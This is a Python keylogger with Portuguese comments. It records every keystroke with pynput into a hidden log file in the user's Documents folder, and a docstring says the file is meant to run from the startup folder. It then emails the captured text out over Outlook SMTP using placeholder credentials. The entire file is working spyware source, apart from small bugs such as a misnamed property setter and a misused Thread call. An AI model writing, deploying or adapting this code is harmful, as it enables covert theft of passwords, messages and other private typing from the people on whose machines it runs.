import getpass
from os import listdir
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
from threading import Thread


class SendMail:
    def __init__(self, meuemail, emaildestino, senha, msg):
        self.__meuemail = meuemail
        self.__emaildestino = emaildestino
        self.__senha = senha
        self.__msg = msg
        
    @property
    def meuemail(self):
        return self.__meuemail
    
    @property
    def emaildestion(self):
        return self.__emaildestino
    
    @emaildestino.setter
    def emaildestino(self, novo):
        self.__emaildestino = novo

    def sendEmail(self):
        """Envia os e-mails pontuando prováveis efeitos"""
        server = 'smtp-mail.outlook.com'
        port = 587
        bind = smtplib.SMTP(server, port)
        # login:
        bind.ehlo()
        bind.starttls()  # criptografia
        bind.login(self.__meuemail, self.__senha)
        # dados:
        enviar_msg = MIMEMultipart()
        enviar_msg['Subject'] = 'Controle Bot Crawler'
        enviar_msg['From'] = self.__meuemail
        enviar_msg['To'] = self.__emaildestino
        enviar_msg.attach(MIMEText(self.__msg, 'plain'))
        return bind.sendmail(enviar_msg['From'], enviar_msg['To'], enviar_msg.as_string())


class CaptureTheKey:
    """
    Arquivo que será movido para pasta de inicialização
    """
    digitado = []
    contador = 0

    @classmethod
    def press(clt, key):
        """
        captura o que for digitado
        """
        try:
            CaptureTheKey.digitado.append(key.char)
            CaptureTheKey.contador += 1
            return CaptureTheKey.formata_saida()
        except AttributeError:
            tecla_especial = key
            if str(tecla_especial) == 'Key.shift':
                pass
            elif str(tecla_especial) == 'Key.enter':
                CaptureTheKey.digitado.append(' enter ')
                return CaptureTheKey.formata_saida()
            elif str(tecla_especial) == 'Key.space':
                CaptureTheKey.digitado.append(' ')
                return CaptureTheKey.formata_saida()
            elif str(tecla_especial) == 'Key.backspace':
                CaptureTheKey.digitado.append(' backspace ')
                return CaptureTheKey.formata_saida()
        except TypeError:
            CaptureTheKey.digitado.append(' typeError, talvez, um ? foi digitado ')
            CaptureTheKey.formata_saida()
        finally:
            if CaptureTheKey.contador > 50:
                CaptureTheKey.digitado.append('\n')
                CaptureTheKey.contador = 0

    @classmethod
    def formata_saida(clt):
        with open(f'/home/{getpass.getuser()}/Documents/.reg.log', 'w') as f:
            [f.writelines(coisas) for coisas in CaptureTheKey.digitado]


if __name__ == '__main__':
    texto = ""
    # email
    if '.reg.log' in listdir(f'/home/{getpass.getuser()}/Documents/'):
        with open(f'/home/{getpass.getuser()}/Documents/.reg.log', 'r') as f:
            tamanho = f.read()
        if len(tamanho) > 0:
            for palavras in tamanho:
                texto += palavras
            instancia = SendMail('email@email.com', 'email@email.com', 'senha', texto)
            th = Thread(instancia.sendEmail(), args=())
            th.start()
            th.join()
    # continua...
    with keyboard.Listener(on_press=CaptureTheKey.press) as listener:
        listener.join()
"Enivrez-vous"
